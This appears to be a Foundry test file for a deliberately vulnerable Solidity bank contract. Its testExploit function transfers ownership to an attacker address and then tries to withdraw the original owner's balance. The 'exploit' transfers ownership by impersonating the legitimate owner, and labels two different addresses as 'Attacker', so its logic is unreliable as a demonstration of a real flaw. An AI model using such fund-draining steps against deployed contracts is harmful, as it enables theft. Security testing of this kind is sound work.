// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address initialOwner;
    address attacker;
    
    function setUp() public override {
        target = new VulnerableBank();
        initialOwner = target.owner();
        vm.label(initialOwner, "Initial Owner");
        vm.label(address(this), "Attacker");

        // Create two accounts: one for the initial owner and another for the attacker
        attacker = vm.addr(2);
    }

    function testExploit() public {
        address[] memory usersWithBalance = new address[](1);
        usersWithBalance[0] = initialOwner;

        // Transfer ownership from initial owner to attacker
        vm.startPrank(initialOwner);
        target.transferOwnership(attacker);
        vm.stopPrank();

        // Verify that the ownership has been transferred successfully
        assertEq(target.owner(), attacker);

        balanceLog.logBalances(usersWithBalance, "Before Exploit");

        // Check if the attacker can withdraw funds from any user's balance (e.g., initial owner)
        if (target.balances(initialOwner) > 0) {
            vm.startPrank(attacker);
            target.withdraw(target.balances(initialOwner));
            vm.stopPrank();
        }

        balanceLog.logBalances(usersWithBalance, "After Exploit");
    }
}